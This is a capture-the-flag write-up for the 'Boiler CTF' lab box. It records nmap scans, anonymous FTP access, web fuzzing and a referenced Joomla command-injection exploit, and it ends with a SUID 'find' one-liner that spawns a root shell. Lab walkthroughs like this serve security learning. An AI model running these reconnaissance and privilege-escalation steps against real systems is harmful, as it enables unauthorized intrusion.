@@ -1,0 +1,130 @@
+*** Just a tricky box ***
+___________________________________
+# nmap
+```
+┌──(kali㉿kali)-[~/THM/Boiler CTF]
+└─$ nmap -p- 10.48.141.176 --min-rate=1000
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 14:26 -0500
+Nmap scan report for 10.48.141.176
+Host is up (0.056s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+80/tcp    open  http
+10000/tcp open  snet-sensor-mgmt
+55007/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 36.29 seconds
+```
+____________________________________________________________________________________________________________________________________________
+
+[ Second Scan]
+```
+┌──(kali㉿kali)-[~/THM/Boiler CTF]
+└─$ nmap -p21,80,10000,55007 -A 10.48.141.176 --min-rate=1000
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 14:28 -0500
+Nmap scan report for 10.48.141.176
+Host is up (0.056s latency).
+
+PORT      STATE    SERVICE          VERSION
+21/tcp    open     ftp              vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.199.3
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+80/tcp    open     http             Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: Apache2 Ubuntu Default Page: It works
+10000/tcp filtered snet-sensor-mgmt
+55007/tcp filtered unknown
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.13 (96%), Linux 4.4 (96%), Linux 3.10 - 3.13 (95%), Linux 5.4 (94%), Linux 3.8 - 3.16 (93%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 6.0>
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Unix
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   54.04 ms 192.168.128.1
+2   ...
+3   54.43 ms 10.48.141.176
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.01 seconds
+```
+____________________________________________________________________________________________________________________________________________
+
+# FTP
+
+[ Login Successful ]
+```
+┌──(kali㉿kali)-[~/THM/Boiler CTF]
+└─$ ftp 10.48.141.176
+Connected to 10.48.141.176.
+220 (vsFTPd 3.0.3)
+Name (10.48.141.176:kali): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+```
+____________________________________________________________________________________________________________________________________________
+[ Found a file]
+```
+229 Entering Extended Passive Mode (|||43326|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
+drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
+-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
+226 Directory send OK.
+ftp> get .info.txt
+local: .info.txt remote: .info.txt
+229 Entering Extended Passive Mode (|||41724|)
+150 Opening BINARY mode data connection for .info.txt (74 bytes).
+100% |*************************************************************************************************************************************************************************|    74       78.04 KiB/s    00:00 E>
+226 Transfer complete.
+```
+[ Inside the file we have a text saying "Just wanted to see if you find it.  Lol. Remember: Enumeration is the key!"]
+
+- Further enumerating the higher ports we found a `ssh server` and `webmin` something
+____________________________________________________________________________________________________________________________________________
+
+- Fuzzing the endpoint:
+    `└─$ ffuf -u http://10.48.141.176/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt`
+[ We found an endpoint called joomla ]
+
+- Further Fuzzing that endpoint :
+"└─$ ffuf -u http://10.48.141.176/joomla/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt"
+
+-- We found a endpoint called _test which contains a Command Injection vulnerability : https://www.exploit-db.com/exploits/47204
+____________________________________________________________________________________________________________________________________________
+
+- Now using this we get access to ssh credentials of the user 'basterd' where in a backup file of the home irectory  we get creds of another user called 'stoner'
+[ Do not be confused about the user flag as it is just in an unsual format ]
+
+____________________________________________________________________________________________________________________________________________
+
+# root
+
+- Find SUID files : find / -perm -4000 -type f 2>/dev/null | less
+-- First identify obvious ones: nmap, less, vim, perl, python with SUID often lead to root shells via known tricks.
+_________________________________________________________________________________
+
+[ We identified find in the previous commaand and using GTFO Bins we get to this conclusion.]
+$ /usr/bin/find . -exec /bin/sh -p \; -quit
+# whoami
+root
+# 
+
+BAHAHAHAHA I LOOKED AT DOCUMENTATION FOR THE PRIV_ESC
